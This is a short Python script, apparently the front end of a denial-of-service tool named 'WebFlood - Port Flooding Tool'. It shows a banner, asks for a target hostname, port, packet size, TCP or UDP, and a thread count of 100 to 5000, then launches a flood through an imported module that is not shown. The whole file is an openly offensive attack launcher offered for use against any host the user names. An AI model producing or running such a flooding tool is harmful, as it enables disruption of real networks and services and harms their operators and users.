#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
from network import WebFlood
from utils import colored_txt

print(f'''
                  ~.
           {colored_txt(235, 237, 218,"Ya...")}___|__{colored_txt(235, 237, 218,"..aab")}     .   .
            {colored_txt(235, 237, 218,"Y88a")}  {colored_txt(217, 117, 139,"Y88o")}  {colored_txt(235, 237, 218,"Y88a ")}  (     )
             {colored_txt(235, 237, 218,"Y88b")}  {colored_txt(217, 117, 139,"Y88b")}  {colored_txt(235, 237, 218,"Y88b")}   `.oo'
             {colored_txt(235, 237, 218,":888")}  {colored_txt(217, 117, 139,":888")}  {colored_txt(235, 237, 218,":888")}  ( (`-'
    .---.    {colored_txt(235, 237, 218,"d88P")}  {colored_txt(217, 117, 139,"d88P")}  {colored_txt(235, 237, 218,"d88P")}   `.`.
   / .-._)  {colored_txt(235, 237, 218,"d8P")}..__|___..{colored_txt(235, 237, 218,"Y8P")}      `.`.
  ( (`._) .-.  .-. |.-.  .-.  .-.   ) )
   \ `---( O )( O )( O )( O )( O )-' /
    `.    `-'  `-'  `-'  `-'  `-'  .'         {colored_txt(161, 230, 237,"WebFlood - Port Flooding Tool")}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
''')

host = input('HostName: ')
port = input('Port: ')
bs = input('Byte Size: ')
ptype = input('Protocal Type (TCP or UDP): ')
threads = input('Thread Amount (100-5000): ')

target_network = WebFlood(host, port, bs, ptype)
target_network.attack(target_network._attack, int(threads)) # initiate Flood
